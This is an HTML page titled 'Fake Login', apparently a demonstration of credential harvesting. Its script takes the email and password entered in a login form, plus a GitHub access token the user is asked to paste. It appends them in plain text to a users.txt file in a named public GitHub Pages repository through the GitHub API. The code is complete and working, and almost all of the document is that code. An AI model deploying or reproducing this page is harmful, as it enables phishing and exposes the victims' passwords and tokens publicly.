<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Fake Login</title>

  <style>
    body {
      margin:0; 
      padding:40px;
      background:#0b1220;
      color:#e8f0fe;
      font-family: Arial, Helvetica, sans-serif;
      display:flex;
      justify-content:center;
    }
    .card {
      width:100%;
      max-width:520px;
      background:#111a33;
      padding:24px;
      border-radius:12px;
      border:1px solid #26334d;
    }
    h1 { margin:0 0 15px; font-size:20px; }
    label { margin-top:12px; display:block; font-size:14px; color:#b5c7e0; }
    input {
      width:100%; padding:10px;
      border-radius:6px;
      border:1px solid #344466;
      background:#0d152b; 
      color:#fff;
      margin-top:5px;
    }
    button {
      margin-top:16px; padding:10px;
      background:#06b6d4;
      border:0;
      width:100%;
      color:#00121a;
      font-weight:bold;
      border-radius:8px;
      cursor:pointer;
    }
    pre {
      margin-top:15px;
      background:#090f1f;
      padding:12px;
      border-radius:8px;
      color:#d0e1ff;
      height:120px;
      overflow:auto;
      font-size:13px;
    }
    .danger { color:#ff7272; margin-bottom:10px; font-size:14px; }
  </style>
</head>
<body>

<div class="card">
  <h1>Login</h1>
  <div class="danger"> Demonstrating How Hackers Secretly Store Your Login Credentials</div>

  <form id="userForm">
    <label>Email</label>
    <input id="email" type="email" required placeholder="user@example.com">

    <label>Password</label>
    <input id="password" type="password" required placeholder="password">

    <label>GitHub Personal Access Token (repo scope)</label>
    <input id="token" type="password" placeholder="Paste your PAT">

    <button type="submit">Save to GitHub</button>
  </form>

  <pre id="log">Ready.</pre>
</div>

<script>
(function(){

  // ðŸ”§ CONFIG â€” EDIT THESE TWO
  const OWNER = "Psivasai970";
  const REPO  = "Psivasai970.github.io";
  const PATH  = "users.txt";
  const BRANCH = "main";

  // Optional fallback (NOT SAFE)
  let FALLBACK_GITHUB_TOKEN = "";

  const form = document.getElementById('userForm');
  const logEl = document.getElementById('log');

  function log(msg){
    logEl.textContent = new Date().toISOString() + " â€” " + msg;
    console.log(msg);
  }

  function base64EncodeUnicode(str){
    return btoa(unescape(encodeURIComponent(str || "")));
  }
  function base64DecodeUnicode(b64){
    return decodeURIComponent(escape(atob(b64 || "")));
  }

  function api(path){ return `https://api.github.com${path}`; }

  async function getFile(owner, repo, path, branch, token){
    const url = api(`/repos/${owner}/${repo}/contents/${encodeURIComponent(path)}?ref=${branch}`);
    const res = await fetch(url, {
      headers: { "Authorization": "token " + token }
    });
    if(res.status === 404) return null;
    if(!res.ok) throw new Error("GET failed: " + (await res.text()));
    return await res.json();
  }

  async function createOrUpdateFile(owner, repo, path, branch, contentB64, message, token, sha){
    const url = api(`/repos/${owner}/${repo}/contents/${encodeURIComponent(path)}`);
    const body = { message, content: contentB64, branch };
    if(sha) body.sha = sha;

    const res = await fetch(url, {
      method: "PUT",
      headers: {
        "Authorization": "token " + token,
        "Content-Type": "application/json"
      },
      body: JSON.stringify(body)
    });

    const txt = await res.text();
    if(!res.ok) throw new Error("PUT failed: " + res.status + " " + txt);
    return JSON.parse(txt);
  }

  async function sleep(ms){
    return new Promise(r => setTimeout(r, ms));
  }

  async function appendLineWithRetry(owner, repo, path, branch, token, line, maxRetries=5){
    for(let attempt=0; attempt < maxRetries; attempt++){
      try {
        const file = await getFile(owner, repo, path, branch, token);

        let newContent, sha;
        if(file){
          const existing = base64DecodeUnicode(file.content); 
          newContent = existing + line;
          sha = file.sha;
        } else {
          newContent = line;
          sha = undefined;
        }

        const b64 = base64EncodeUnicode(newContent);
        const msg = file ? "Append user" : "Create users.txt";

        return await createOrUpdateFile(owner, repo, path, branch, b64, msg, token, sha);

      } catch (err){
        const msg = err.message || String(err);
        if(msg.includes("409") || msg.includes("does not match")){
          log("409 conflict â€” retrying...");
          await sleep(300 + attempt * 300);
          continue;
        }
        throw err;
      }
    }
    throw new Error("Failed after retries.");
  }

  form.addEventListener("submit", async (e)=>{
    e.preventDefault();

    try {
      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();
      const token = document.getElementById('token').value.trim() || FALLBACK_GITHUB_TOKEN;

      if(!token){ alert("Token required"); return; }
      if(OWNER.includes("REPLACE")){ alert("Edit OWNER/REPO in file."); return; }

      const line = `${email},${password},${new Date().toISOString()}\n`;
      log("Appending: " + line.trim());

      const result = await appendLineWithRetry(OWNER, REPO, PATH, BRANCH, token, line);
      log("Success! Commit: " + (result.commit?.sha || "unknown"));

      alert("Saved successfully!");

    } catch(err){
      console.error(err);
      log("Error: " + err.message);
      alert("Error: " + err.message);
    }
  });

})();
</script>

</body>
</html>
